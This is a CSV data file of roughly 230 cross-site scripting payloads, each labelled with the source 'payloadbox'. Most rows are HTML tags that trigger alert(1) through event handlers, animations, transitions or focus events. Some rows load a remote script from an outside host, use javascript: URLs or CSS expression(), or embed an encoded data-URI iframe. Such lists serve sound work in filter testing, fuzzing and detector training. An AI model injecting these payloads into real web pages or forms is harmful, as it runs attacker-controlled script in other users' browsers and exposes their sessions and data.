text,source
"<aside onkeypress=""alert(1)"" contenteditable>test</aside>",payloadbox
"<track draggable=""true"" ondragend=""alert(1)"">test</track>",payloadbox
"<style>@keyframes slidein {}</style><option style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></option>",payloadbox
"<select onmousedown=""alert(1)"">test</select>",payloadbox
<div style=xss:expressio\006e(alert(1))>,payloadbox
"<summary draggable=""true"" ondragstart=""alert(1)"">test</summary>",payloadbox
"<img draggable=""true"" ondragend=""alert(1)"">test</img>",payloadbox
"<tbody oncontextmenu=""alert(1)"">test</tbody>",payloadbox
"<dt oncut=""alert(1)"" contenteditable>test</dt>",payloadbox
"<article draggable=""true"" ondragenter=""alert(1)"">test</article>",payloadbox
"<dialog ondblclick=""alert(1)"">test</dialog>",payloadbox
"<progress onmousemove=""alert(1)"">test</progress>",payloadbox
"<area onmouseenter=""alert(1)"">test</area>",payloadbox
<meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>,payloadbox
"<small onmouseenter=""alert(1)"">test</small>",payloadbox
<i id=x tabindex=1 onactivate=alert(1)></i>,payloadbox
"<strike draggable=""true"" ondragstart=""alert(1)"">test</strike>",payloadbox
"<plaintext draggable=""true"" ondrag=""alert(1)"">test</plaintext>",payloadbox
<strike id=x tabindex=1 onfocusin=alert(1)></strike>,payloadbox
<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><textarea ondrop=alert(1) contenteditable>drop here</textarea>",payloadbox
<x%2Fonxxx=1,payloadbox
"<del onclick=""alert(1)"">test</del>",payloadbox
<th id=x tabindex=1 ondeactivate=alert(1)></th><input id=y autofocus>,payloadbox
"<style>@keyframes x{}</style><legend style=""animation-name:x"" onanimationstart=""alert(1)""></legend>",payloadbox
"<i onmouseleave=""alert(1)"">test</i>",payloadbox
<frameset onpageshow=alert(1)>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>",payloadbox
<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>,payloadbox
<base id=x tabindex=1 onactivate=alert(1)></base>,payloadbox
"<wbr draggable=""true"" ondragenter=""alert(1)"">test</wbr>",payloadbox
"<dt onmouseup=""alert(1)"">test</dt>",payloadbox
"<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>",payloadbox
"<style>@keyframes slidein {}</style><var style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></var>",payloadbox
<li id=x tabindex=1 onfocus=alert(1)></li>,payloadbox
"<spacer onkeydown=""alert(1)"" contenteditable>test</spacer>",payloadbox
"<dialog onbeforecopy=""alert(1)"" contenteditable>test</dialog>",payloadbox
"<s onbeforepaste=""alert(1)"" contenteditable>test</s>",payloadbox
"<source onmousemove=""alert(1)"">test</source>",payloadbox
"<style>@keyframes slidein {}</style><main style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></main>",payloadbox
"<mark draggable=""true"" ondragend=""alert(1)"">test</mark>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>",payloadbox
"<track onmouseover=""alert(1)"">test</track>",payloadbox
<multicol id=x tabindex=1 onbeforedeactivate=alert(1)></multicol><input autofocus>,payloadbox
"<progress oncontextmenu=""alert(1)"">test</progress>",payloadbox
"<meter draggable=""true"" ondrag=""alert(1)"">test</meter>",payloadbox
<menuitem id=x tabindex=1 onactivate=alert(1)></menuitem>,payloadbox
"<wbr oncontextmenu=""alert(1)"">test</wbr>",payloadbox
<style id=x tabindex=1 onbeforeactivate=alert(1)></style>,payloadbox
<big id=x tabindex=1 onfocus=alert(1)></big>,payloadbox
"<frame oncopy=""alert(1)"" contenteditable>test</frame>",payloadbox
<article id=x tabindex=1 onactivate=alert(1)></article>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><sub ondragover=alert(1) contenteditable>drop here</sub>",payloadbox
"<thead onbeforecut=""alert(1)"" contenteditable>test</thead>",payloadbox
<svg><i onload=alert(1)></i>,payloadbox
<script>alert(1)</script>,payloadbox
"<form onmouseover=""alert(1)"">test</form>",payloadbox
"<isindex draggable=""true"" ondragleave=""alert(1)"">test</isindex>",payloadbox
"<dfn onbeforecopy=""alert(1)"" contenteditable>test</dfn>",payloadbox
"<title onmouseover=""alert(1)"">test</title>",payloadbox
<dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>,payloadbox
"<kbd onmousemove=""alert(1)"">test</kbd>",payloadbox
"<kbd draggable=""true"" ondragend=""alert(1)"">test</kbd>",payloadbox
"<nobr onmouseup=""alert(1)"">test</nobr>",payloadbox
<link rel=stylesheet href=1 onerror=alert(1)>,payloadbox
"<style>@keyframes slidein {}</style><strike style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></strike>",payloadbox
"<strike onmouseup=""alert(1)"">test</strike>",payloadbox
"<frameset oncopy=""alert(1)"" contenteditable>test</frameset>",payloadbox
<legend id=x tabindex=1 onfocus=alert(1)></legend>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><a ondrop=alert(1) contenteditable>drop here</a>",payloadbox
"<details onkeypress=""alert(1)"" contenteditable>test</details>",payloadbox
"<br onmousemove=""alert(1)"">test</br>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",payloadbox
"<style>:target {color:red;}</style><tt id=x style=""transition:color 1s"" ontransitionend=alert(1)></tt>",payloadbox
"<style>@keyframes slidein {}</style><template style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></template>",payloadbox
"<pre onbeforepaste=""alert(1)"" contenteditable>test</pre>",payloadbox
"<ul onmousemove=""alert(1)"">test</ul>",payloadbox
"<span oncontextmenu=""alert(1)"">test</span>",payloadbox
"<dfn oncut=""alert(1)"" contenteditable>test</dfn>",payloadbox
<p id=x tabindex=1 onactivate=alert(1)></p>,payloadbox
"<rb oncut=""alert(1)"" contenteditable>test</rb>",payloadbox
"<strong oncopy=""alert(1)"" contenteditable>test</strong>",payloadbox
<header id=x tabindex=1 onfocus=alert(1)></header>,payloadbox
"<style>:target {color: red;}</style><tt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tt>",payloadbox
"<wbr onmouseup=""alert(1)"">test</wbr>",payloadbox
<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>,payloadbox
"<button onbeforepaste=""alert(1)"" contenteditable>test</button>",payloadbox
"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationend=""alert(1)""></address>",payloadbox
<div style=xss:expressio&#x5c;6e(alert(1))>,payloadbox
"<tbody onpaste=""alert(1)"" contenteditable>test</tbody>",payloadbox
"<style>:target {color:red;}</style><strike id=x style=""transition:color 1s"" ontransitionend=alert(1)></strike>",payloadbox
"<isindex draggable=""true"" ondrag=""alert(1)"">test</isindex>",payloadbox
"<style>@keyframes x{}</style><s style=""animation-name:x"" onanimationend=""alert(1)""></s>",payloadbox
"<meter onmouseleave=""alert(1)"">test</meter>",payloadbox
"<q onmouseup=""alert(1)"">test</q>",payloadbox
<object onblur=alert(1) tabindex=1 id=x></object><input autofocus>,payloadbox
"<object onkeyup=""alert(1)"" contenteditable>test</object>",payloadbox
<tt id=x tabindex=1 onfocusin=alert(1)></tt>,payloadbox
"<button onkeyup=""alert(1)"" contenteditable>test</button>",payloadbox
"<p onclick=""alert(1)"">test</p>",payloadbox
<x onxxx=1 onxxx=1,payloadbox
"<p draggable=""true"" ondragstart=""alert(1)"">test</p>",payloadbox
"<IMG SRC=""javascript:alert('XSS');"">",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><font ondrop=alert(1) contenteditable>drop here</font>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><big id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></big>",payloadbox
"<ol oncontextmenu=""alert(1)"">test</ol>",payloadbox
<ul id=x tabindex=1 ondeactivate=alert(1)></ul><input id=y autofocus>,payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><legend id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></legend>",payloadbox
"<thead onbeforepaste=""alert(1)"" contenteditable>test</thead>",payloadbox
"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationend=""alert(1)""></em>",payloadbox
<svg><menuitem onload=alert(1)></menuitem>,payloadbox
"<body onmouseover=""alert(1)"">test</body>",payloadbox
<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>,payloadbox
"<style>:target {color:red;}</style><p id=x style=""transition:color 1s"" ontransitionend=alert(1)></p>",payloadbox
"<li onclick=""alert(1)"">test</li>",payloadbox
"<frame onkeypress=""alert(1)"" contenteditable>test</frame>",payloadbox
<cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>,payloadbox
"<input oncut=alert(1) value=""XSS"" autofocus>",payloadbox
"<dt onmousemove=""alert(1)"">test</dt>",payloadbox
"<style>:target {color: red;}</style><title id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></title>",payloadbox
"<style>@keyframes x{}</style><output style=""animation-name:x"" onanimationstart=""alert(1)""></output>",payloadbox
"<rb onmousedown=""alert(1)"">test</rb>",payloadbox
"<strong oncut=""alert(1)"" contenteditable>test</strong>",payloadbox
<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>,payloadbox
"<output oncopy=""alert(1)"" contenteditable>test</output>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noscript id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></noscript>",payloadbox
"<cite onmouseover=""alert(1)"">test</cite>",payloadbox
"<li onbeforecopy=""alert(1)"" contenteditable>test</li>",payloadbox
"<style>@keyframes slidein {}</style><element style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></element>",payloadbox
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>,payloadbox
"<tt onpaste=""alert(1)"" contenteditable>test</tt>",payloadbox
"<plaintext onkeyup=""alert(1)"" contenteditable>test</plaintext>",payloadbox
"<sub oncontextmenu=""alert(1)"">test</sub>",payloadbox
"<footer draggable=""true"" ondrag=""alert(1)"">test</footer>",payloadbox
"<dd onbeforecut=""alert(1)"" contenteditable>test</dd>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><spacer id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></spacer>",payloadbox
"<pre ondblclick=""alert(1)"">test</pre>",payloadbox
"<div id=""105""><iframe src=""data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03""></iframe>//[""'`-->]]>]</div><div id=""106""><img src onerror /"" '""= alt=alert(106)//"">//[""'`-->]]>]</div><div id=""107""><title onpropertychange=alert(107)></title><title title=></title>//[""'`-->]]>]</div>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable>drop here</summary>",payloadbox
"<basefont onmouseout=""alert(1)"">test</basefont>",payloadbox
"<strike ondblclick=""alert(1)"">test</strike>",payloadbox
"<div id=""91"">[A]",payloadbox
"<param onmouseout=""alert(1)"">test</param>",payloadbox
<li id=x tabindex=1 onbeforeactivate=alert(1)></li>,payloadbox
"<style>@keyframes x{}</style><blink style=""animation-name:x"" onanimationend=""alert(1)""></blink>",payloadbox
"<iframe src=""http://example.org/""></iframe>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><optgroup id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></optgroup>",payloadbox
<shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>,payloadbox
"<embed onmouseleave=""alert(1)"">test</embed>",payloadbox
<mark id=x tabindex=1 onbeforedeactivate=alert(1)></mark><input autofocus>,payloadbox
"<meter draggable=""true"" ondragenter=""alert(1)"">test</meter>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><thead ondrop=alert(1) contenteditable>drop here</thead>",payloadbox
"<output draggable=""true"" ondragenter=""alert(1)"">test</output>",payloadbox
"<p onmouseover=""alert(1)"">test</p>",payloadbox
"<element onmouseout=""alert(1)"">test</element>",payloadbox
"<rtc onmousedown=""alert(1)"">test</rtc>",payloadbox
"<optgroup oncopy=""alert(1)"" contenteditable>test</optgroup>",payloadbox
"<style>@keyframes x{}</style><hgroup style=""animation-name:x"" onanimationend=""alert(1)""></hgroup>",payloadbox
"<ul oncontextmenu=""alert(1)"">test</ul>",payloadbox
<select onchange=alert(1)><option>1<option>2,payloadbox
"<tt onclick=""alert(1)"">test</tt>",payloadbox
<samp id=x tabindex=1 onbeforedeactivate=alert(1)></samp><input autofocus>,payloadbox
"<style>:target {color:red;}</style><br id=x style=""transition:color 1s"" ontransitionend=alert(1)></br>",payloadbox
<picture onfocusout=alert(1) tabindex=1 id=x></picture><input autofocus>,payloadbox
"<button oncut=""alert(1)"" contenteditable>test</button>",payloadbox
"<code onclick=""alert(1)"">test</code>",payloadbox
"<img onkeyup=""alert(1)"" contenteditable>test</img>",payloadbox
<article id=x tabindex=1 onfocus=alert(1)></article>,payloadbox
"<button draggable=""true"" ondragleave=""alert(1)"">test</button>",payloadbox
<xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>,payloadbox
"<th onmousemove=""alert(1)"">test</th>",payloadbox
"<frameset onmousemove=""alert(1)"">test</frameset>",payloadbox
"<br oncontextmenu=""alert(1)"">test</br>",payloadbox
"<legend draggable=""true"" ondragstart=""alert(1)"">test</legend>",payloadbox
<html ontouchmove=alert(1)>,payloadbox
"<strong draggable=""true"" ondrag=""alert(1)"">test</strong>",payloadbox
"<rt onclick=""alert(1)"">test</rt>",payloadbox
"<mark onmouseleave=""alert(1)"">test</mark>",payloadbox
"<iframe onkeypress=""alert(1)"" contenteditable>test</iframe>",payloadbox
<noframes id=x tabindex=1 ondeactivate=alert(1)></noframes><input id=y autofocus>,payloadbox
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>,payloadbox
<ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>,payloadbox
"<fieldset draggable=""true"" ondragleave=""alert(1)"">test</fieldset>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><dl id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dl>",payloadbox
<label id=x tabindex=1 onbeforedeactivate=alert(1)></label><input autofocus>,payloadbox
"<hgroup onkeypress=""alert(1)"" contenteditable>test</hgroup>",payloadbox
"<sup onmouseleave=""alert(1)"">test</sup>",payloadbox
"<i ondblclick=""alert(1)"">test</i>",payloadbox
"<cite onbeforepaste=""alert(1)"" contenteditable>test</cite>",payloadbox
"<content onkeyup=""alert(1)"" contenteditable>test</content>",payloadbox
"<header onclick=""alert(1)"">test</header>",payloadbox
<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>,payloadbox
"<center oncopy=""alert(1)"" contenteditable>test</center>",payloadbox
"<svg onmouseout=""alert(1)"">test</svg>",payloadbox
"<thead draggable=""true"" ondragstart=""alert(1)"">test</thead>",payloadbox
"<tfoot onkeypress=""alert(1)"" contenteditable>test</tfoot>",payloadbox
"<table onbeforecopy=""alert(1)"" contenteditable>test</table>",payloadbox
<dd id=x tabindex=1 onfocus=alert(1)></dd>,payloadbox
"<th onbeforepaste=""alert(1)"" contenteditable>test</th>",payloadbox
"<font onbeforecut=""alert(1)"" contenteditable>test</font>",payloadbox
"<shadow oncopy=""alert(1)"" contenteditable>test</shadow>",payloadbox
<rb id=x tabindex=1 onfocusin=alert(1)></rb>,payloadbox
<footer id=x tabindex=1 onbeforedeactivate=alert(1)></footer><input autofocus>,payloadbox
"<slot draggable=""true"" ondrag=""alert(1)"">test</slot>",payloadbox
"<del onkeyup=""alert(1)"" contenteditable>test</del>",payloadbox
"<header draggable=""true"" ondragleave=""alert(1)"">test</header>",payloadbox
<li id=x tabindex=1 onfocusin=alert(1)></li>,payloadbox
"<header draggable=""true"" ondragend=""alert(1)"">test</header>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><progress id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></progress>",payloadbox
"<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationstart=""alert(1)""></listing>",payloadbox
<u id=x tabindex=1 ondeactivate=alert(1)></u><input id=y autofocus>,payloadbox
